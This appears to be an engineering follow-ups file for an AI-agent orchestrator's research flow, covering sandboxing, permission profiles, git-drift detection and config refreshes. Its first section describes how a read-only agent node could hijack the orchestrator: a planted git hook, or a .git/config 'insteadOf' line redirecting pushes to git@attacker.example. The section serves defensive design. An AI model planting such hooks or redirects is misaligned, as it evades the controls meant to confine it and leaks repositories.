# deep_research post-mortem — follow-ups

The campaign's running list of things that outlived the item that produced them: open decisions, watch items, operational consequences, and deliberate non-goals. Each item's own document remains the record of what it did and why; this file exists so the residue does not have to be rediscovered by re-reading eight documents.

Add to it as items land. Keep an entry only while it can still cost something — delete it when it is done or has become untrue, rather than marking it resolved.

- [Needs a decision](#needs-a-decision) — someone has to answer before it can close
- [Watch items](#watch-items) — nothing to do unless the world changes
- [Operational consequences](#operational-consequences) — true of every target repo, not of the code
- [Carried into `main`](#carried-into-main) — the derived-docs refresh backlog
- [Deliberate non-goals](#deliberate-non-goals) — decided against; recorded so they are re-decided, not re-discovered

## Needs a decision

### A poisoned `.git` still parks the task — confirm this is what was meant (P1.4a)

Operator decision 2 (2026-07-26) says a read-only node holding the git-evidence grant must **never** park the task in `manual_action_required`. That is implemented for a working-tree write. It was **not** applied to Git control-state drift, which still raises `NodeManualRequired` on its existing path. One line either way; needs a yes/no.

The two are different events, and the difference is what the decision turns on:

- **A stray file in the working tree.** The node leaves `notes.txt` (or overwrites `README.md`) in the clone. Nothing acts on it: `_apply_post_edit_guard` stays off for a read-only node, so no diff is captured, nothing is staged, no downstream node is handed it, and the publish node commits an explicit pathspec rather than whatever is lying around. The file just sits there until the clone is cleaned up. Parking a whole audit run over that would trade a real capability for a harmless accident — so: console warning + ⚠️ trace, outcome stays `done`. **This is decision 2, implemented.**
- **A rewritten Git control file.** Two concrete shapes:
  - `.git/hooks/post-checkout` (or `pre-commit`, `post-commit`, …) gains a script. Git hooks are executed by **whoever runs the next git command in that clone** — and the next git command is the orchestrator's own commit / branch switch / push. The node needs write access to nothing else: it has arranged for the orchestrator to run its code, with the orchestrator's credentials.
  - `.git/config` gains `[url "git@attacker.example:x.git"] insteadOf = git@github.com:` — the orchestrator's later `git push` then pushes the branch somewhere else, and everything up to that point looks normal.

  Both defeat the "only the orchestrator does commit / push / PR" invariant by borrowing the orchestrator rather than bypassing it. This is what the WRI-009 fingerprint exists to catch, and before [P1.4a](p1-4a-read-only-git-evidence.md) a read-only node was not fingerprinted at all — its §1 named that as an unwatched hole and its §3 asked for the fingerprint so that drift "is still detected". Detection that only logs would let the orchestrator go on to commit and push through the poisoned clone, which is the outcome the guard was built to prevent.

So the reading implemented is: decision 2 governs **the accident it describes** (a stray write), and does not silently downgrade a pre-existing security invariant for exactly the node class that just gained a shell.

**If the literal reading was intended** — never park, whatever changed — the change is at the compare site in [`core/flow/nodes/agent.py`](../../../src/wastech_orchestrator/core/flow/nodes/agent.py), in `_invoke`, where `compare_git_control_state` currently raises:

```python
if control_before is not None and git is not None:
    drift = git.compare_git_control_state(control_before)
    if drift is not None:
        raise NodeManualRequired(...)  # ← today, for every attempt that can run commands
```

Making it warn-only for a read-only-with-shell attempt means branching on `self._is_workspace_write(node, ctx)` there and routing the read-only case into the same `read_only_write` signal the working-tree check already uses. Roughly ten lines including the test. Do **not** do it by dropping the fingerprint — losing detection is strictly worse than either behavior.

### Does `architecture_design` keep its shell, or lose it to the profile downgrade? (P2.9)

[P2.9](p2-9-deliverable-containment.md)'s option 1 asks for two things: stop telling the node to write notes into the deliverable directory (done) and drop it from `workspace-write` to `read-only`, "which also removes an unused write grant". The downgrade was **not** made, because the grant stopped being unused a day after that sentence was written: [P1.5](p1-5-research-role-prompts.md) gave this node the empirical-confirmation remit, and on Claude `read-only` grants `Read`/`Glob`/`Grep` and no shell — so `read-only` would delete the ability to settle a claim by running the project's own test suite or a one-liner. `.agents/rules/security.md` makes that trade a rule violation, not a judgment call, and the symptom the item exists to fix is already closed by the prompt edit plus the write-containment guard.

What is genuinely lost by keeping the grant: a prompt-following lapse _could_ still write into the report directory, where `read-only` would make it impossible. If the operator wants that guarantee more than the reproduction capability, the change is two lines and one paragraph:

- `permission_profile: workspace-write` → `read-only` on the `architecture_design` node in `packaged/flows/deep_research.yaml`, and drop the comment above it explaining why the grant is held;
- delete the **Confirm empirically what you can** paragraph from `packaged/flows/deep_research/architecture_design.md` — leaving it would be exactly the "asserts a mechanism the node does not have" defect [P3.10](p3-10-flow-and-config-hygiene.md) and [P1.5](p1-5-research-role-prompts.md) were both about.

Do not do half of it. A `read-only` node whose prompt still promises a shell is worse than either end state.

## Watch items

### `--allowedTools` allow-direction semantics are pinned by a manual probe, not by the suite (P1.4a)

The Claude half of the git-evidence grant rests on a fact about `claude` 2.1.217 that no offline test can assert: under `--permission-mode dontAsk`, a `Bash` invocation matching none of the `--allowedTools` patterns is auto-**denied**. It was verified by hand (all four probes are recorded in [P1.4a](p1-4a-read-only-git-evidence.md)'s `## Implemented`), and the presence of the `--allowedTools` flag is checked at preflight — but the _semantics_ are not, because proving them needs a real model turn.

If a future CLI flips that default to auto-approve, the verb allowlist becomes decorative and the granted shell is unrestricted. The blast radius is bounded by the second layer: the OS sandbox write-denies the whole clone, so the node still cannot change the repository, and `security.denied_commands` still blocks commit/push/PR. What would be lost is the confinement to _reading git_ — the node could run arbitrary read commands.

Re-probe when pinning a new Claude CLI major, using the four probes in the item. If the behavior ever flips, the documented fallback is the one the item names: drop the verb allowlist and rely on the sandbox alone, exactly like Codex.

### `deep_research` can now park on a host toolchain, which it never could before (P3.10 10g)

The `document_checks` node is the flow's first `command_profile` node, and that checker is fail-closed in a way the `citation` checker is not: if a selected command's toolchain is absent on the host, or every selected check is skipped, it raises `manual_action_required` rather than failing quality — a fix loop cannot install toolchains. So a research run on a machine without the target's formatter now parks where it previously published. That is the intended behavior of a gate (the alternative is committing unchecked files, which is the defect the item exists to fix) and it matches how the `implementation` flow has always behaved. It is listed here because the flow's failure profile changed: a `deep_research` operator who has never configured `command_sets` sees no change at all, and one who configures them gains a new way for a long expensive run to stop at the last step. Note `skip_if_unavailable: true` only _half_ helps — it turns the launch failure into a loud skip, but a set that is the only one selected and then skipped leaves the gate with nothing run, which parks the task on the same path. Per-task `nodes.document_checks.enabled: false` is the clean escape.

### The git-evidence master switch does not gate Codex, and cannot (P1.4a)

`security.allow_git_evidence: false` (the default) does **not** mean "no node can read git history anywhere". It means "no node gains a capability it did not already have". A Codex `read-only` node can run `git log` today and will keep doing so with the switch off, because Codex's `read-only` sandbox permits command execution — its mutation ban comes from the workspace being mounted `read` with the network off, not from a verb list.

So the provider asymmetry [P1.4a](p1-4a-read-only-git-evidence.md)'s Problem section describes is **resolved only when the switch is on**. With it off, the same flow still has different reach depending on which provider runs the node. That is the intended behavior of an opt-in and is stated in `guide/flows/reference.md`, but an operator who reads the switch as a global kill-switch will be surprised.

## Operational consequences

### Target repositories need a `.worc/flows/` refresh (P0.1, P1.4, P1.4a, P2.8, P2.9, P3.10)

A target repo that already carries `.worc/flows/deep_research.yaml` keeps running **its own** copy, so nothing the campaign changed in the packaged flow reaches it until that tree is refreshed. Everything the campaign touched in the flow has accumulated behind that one refresh:

- **[P1.4](p1-4-audit-coverage-gate.md)** — the refresh must bring the four new role files (`analysis_core.md`, `analysis_surfaces.md`, `analysis_docs_tests.md`, `coverage.md`) and drop `repository_analysis.md`, **or the flow fails to load on a missing `role_file`**. This is the only entry here that can break a run rather than merely withhold an improvement.
- **[P0.1](p0-1-evaluator-gate-severity.md)** — `gate_severity` on the packaged evaluators.
- **[P1.4a](p1-4a-read-only-git-evidence.md)** — `git_evidence: true` on the three analysis nodes. Withholding it is harmless: the nodes keep behaving as they do today.
- **[P2.8](p2-8-node-output-handoff.md)** — `output_file: report.md` on `synthesis`, plus the rewritten `verifier.md` / `critic.md`. These two go together: without the flow field, `{synthesis_path}` resolves to the node's closing message, so refreshing only the prompts would point both evaluators at a summary instead of the deliverable. Refreshing only the flow field is harmless.
- **[P2.9](p2-9-deliverable-containment.md)** — the rewritten `architecture_design.md` / `synthesis.md`. Withholding them keeps shipping the intermediate blueprint in the pull request.
- **[P3.10](p3-10-flow-and-config-hygiene.md)** — `refinement` without its `when:`, and the new `document_checks` node with its two edges. The gate is inert until the target also defines a `checks.command_sets` entry whose `paths` match the committed documents (below).

Worth doing as one refresh with one verification pass (`worc validate-flow deep_research`) rather than six.

### The document gate needs a matching command set in the target's config (P3.10 10g)

[P3.10](p3-10-flow-and-config-hygiene.md)'s `document_checks` node runs the operator's own `checks.command_sets`, diff-selected. A repository with no set matching the committed documents selects nothing and passes vacuously — so the node is present and does nothing until the target adds one (for the repo that produced this campaign: a `docs` set with `paths: ["**/*.md"]` running its Markdown format check). Two things to get right in that set: name a _checking_ command, because one that rewrites files trips the core's green-but-dirtying guard and parks the task; and remember a catch-all set with no `paths` runs on **any** non-empty diff, so a research run would pull the whole code gate in behind it.

### Three target-config edits and one task-file habit the campaign did not make (P3.10 10a, 10e, 10f)

None of these live in this repository, and all four are one-liners in the target's `.worc/`:

- `config.example.yaml` at `schema_version: 24` against a packaged `31` — re-copy from the packaged file.
- `agents.retry.max_blocked_s: 3600.0` against a current default of `21600.0` — a mid-run rate limit would fail the task ~5 h early.
- `agents.providers.codex.model: gpt-5.4` against packaged `gpt-5.5` — inert for this flow, still stale.
- Stop setting `nodes.refinement.enabled: false` in the task file: with the `when:` predicate gone, that switch is now the _only_ thing keeping the scoping pass from running, and the pass is where an audit-shaped question gets its per-subsystem sub-questions.

The ≈ −$0.7 reasoning trim is in the same category: the packaged flow pins no `reasoning`, so the trim is a target-side edit — and only the `architecture_design` half of it, since [P3.10](p3-10-flow-and-config-hygiene.md)'s `## Implemented` declines the `fact_verification` half.

### `git_evidence` on the packaged analysis nodes was implementation initiative (P1.4a)

[P1.4a](p1-4a-read-only-git-evidence.md) §4 specified the declaration _surface_, not that the packaged flow use it. The three `deep_research` analysis nodes were given `git_evidence: true` anyway, on the reasoning recorded in its `## Implemented`: leaving the capability reachable-but-undeclared would mean hand-editing a packaged flow to get any benefit from the item. Inert by default. Flagged here in case that call is not wanted — removing it is three lines of YAML.

## Carried into `main`

The `docs/` tree is reconstructed on `main` from the merged `dev` diff as a separate task. Doc-impact notes the campaign has accumulated for it, so the reconstruction has breadcrumbs rather than a bare diff:

- **[P1.4](p1-4-audit-coverage-gate.md)** — the node-output channel now spans evaluators (`configuration.md`, the flow-authoring page's prompt-variable table); `deep_research`'s graph gained three nodes and a gate (`worc_architecture.md`, `cookbook.md`).
- **[P1.4a](p1-4a-read-only-git-evidence.md)** — a new `security.*` key and a new per-node flow field (`configuration.md`, the flow-authoring page); and the `read-only` permission profile no longer implies "no shell" (`worc_architecture.md`, `glossary.md`).
- **[P2.8](p2-8-node-output-handoff.md)** — a new per-node flow field `output_file` (`configuration.md`, the flow-authoring page's node-field table); the node-output channel can now carry a produced document rather than the node's message (`worc_architecture.md`'s handoff description, `glossary.md` if it defines the channel); `citation.json` gained `manifest_path` (`configuration.md`'s checker section).
- **[P2.9](p2-9-deliverable-containment.md)** — no engine change, but the `repository_document` story changes in prose: the structuring node writes nothing and the deliverable directory holds only the deliverable (`cookbook.md`, `worc_architecture.md`).
- **[P3.10](p3-10-flow-and-config-hygiene.md)** — `deep_research`'s graph gained a `command_profile` gate and lost `refinement`'s predicate (`worc_architecture.md`, `cookbook.md`); and the two `when:` facts are now documented as what they actually resolve (`configuration.md` — this is the one an operator is most likely to misread).

## Deliberate non-goals

Decided against, not overlooked.

### P1.4a — read-only git evidence

- **No `isolation_reasons` arm for the grant.** That preflight receives only the provider config and cannot see whether any node declares `git_evidence`, so keying it on the switch alone would fail preflight for runs that never use the capability. The host check that matters is per-attempt and already lives in the adapter, with the declaration in hand — a granted shell on a host that cannot sandbox it raises `CAPABILITY_UNAVAILABLE` there. Reasoning is in the module docstring of [`security/isolation.py`](../../../src/wastech_orchestrator/security/isolation.py). Revisit only if operators start hitting the per-attempt refusal late in a run and want it earlier.
- **No evaluator-side write detection.** The field is accepted on evaluator nodes and reaches the request, but the before/after working-tree comparison lives in the agent runner only, as §3 describes. An evaluator with a granted shell is protected by the same sandbox; it simply would not produce the warning if that sandbox failed. Worth adding if a flow ever grants an evaluator the verbs in practice.
- **`None` and `False` on the node field carry the same behavior.** Both mean "did not ask". The tri-state is the shape operator decision 1 called for and mirrors `network_access`; what would give `False` its own meaning is a flow-wide default, and no flow needs one.
- **Codex adapter untouched.** A test pins that its profile is unchanged _and why_ — three keys, no command dimension, workspace `read`, network off, which is a stronger mutation ban than any allowlist can be.

### P2.8 — node output handoff

- **Piece 3 (the footer slot) is not scheduled.** The item itself asks for it to be argued separately, and its two halves have different costs: an upstream-output slot changes the shape of every rendered prompt in every flow, and the size-bounded `{<node_id>_content}` companion is the only part of the campaign that touches the documented "never inline content" doctrine. Neither is needed for the acceptance criteria — the packaged prompts name `{<node_id>_path}`, and after piece 1 that path is the artifact. Revisit if operators start hand-writing the same upstream reference into every role file.
- **No `{report_dir}` prompt variable.** It was the obvious way to let the verifier name the deliverable directory without the `docs/research/{task_id}` convention, and it would have cleaned `synthesis.md` too. Rejected as a new core variable for one sentence: the deliverable reaches the evaluators on the node-output channel, and the manifest's location is now published in `citation.json`. Reconsider only if a role prompt needs the _directory_ for something other than reaching a file a node produced.
- **The produced file is copied, not referenced.** `{<node_id>_path}` still points into the redacted exchange, so an evaluator grades a copy of the deliverable rather than the file the publish node will commit. That is deliberate (WRI-001 — a live repository path never enters a prompt) and the copy is byte-identical unless redaction fires, which for a research report means a secret got written into the deliverable. Worth knowing when reading a finding that quotes a line number.
